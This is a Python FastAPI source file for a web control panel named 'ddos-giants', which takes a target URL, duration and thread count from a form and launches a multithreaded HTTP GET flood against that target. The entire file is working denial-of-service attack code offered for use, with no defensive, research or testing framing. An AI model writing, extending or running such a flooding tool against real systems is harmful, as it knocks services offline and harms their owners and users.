from fastapi import FastAPI, Form
from fastapi.responses import HTMLResponse
import threading
import time
import requests

app = FastAPI()

attack_status = {"running": False, "target": None, "threads": 0, "duration": 0}

def attack(target_url: str, duration: int, threads: int):
    attack_status["running"] = True
    attack_status["target"] = target_url
    attack_status["threads"] = threads
    attack_status["duration"] = duration

    end_time = time.time() + duration

    def send_request():
        while time.time() < end_time and attack_status["running"]:
            try:
                requests.get(target_url)
            except:
                pass

    thread_list = []
    for _ in range(threads):
        t = threading.Thread(target=send_request)
        t.start()
        thread_list.append(t)

    for t in thread_list:
        t.join()

    attack_status["running"] = False

@app.get("/", response_class=HTMLResponse)
async def home():
    status = "Running" if attack_status["running"] else "Idle"
    return f"""
    <html>
        <head>
            <title>ddos-giants Control Panel</title>
        </head>
        <body>
            <h1>ddos-giants Web Control</h1>
            <p>Status: {status}</p>
            <form action="/start" method="post">
                <label>Target URL:</label><br>
                <input type="text" name="target_url" required><br>
                <label>Duration (seconds):</label><br>
                <input type="number" name="duration" required><br>
                <label>Threads:</label><br>
                <input type="number" name="threads" required><br><br>
                <button type="submit">Start Attack</button>
            </form>
        </body>
    </html>
    """

@app.post("/start", response_class=HTMLResponse)
async def start_attack(target_url: str = Form(...), duration: int = Form(...), threads: int = Form(...)):
    if attack_status["running"]:
        return "<h2>Attack is already running. Please wait.</h2><a href='/'>Back</a>"

    thread = threading.Thread(target=attack, args=(target_url, duration, threads))
    thread.start()
    return f"<h2>Attack started on {target_url} for {duration} seconds with {threads} threads.</h2><a href='/'>Back</a>"
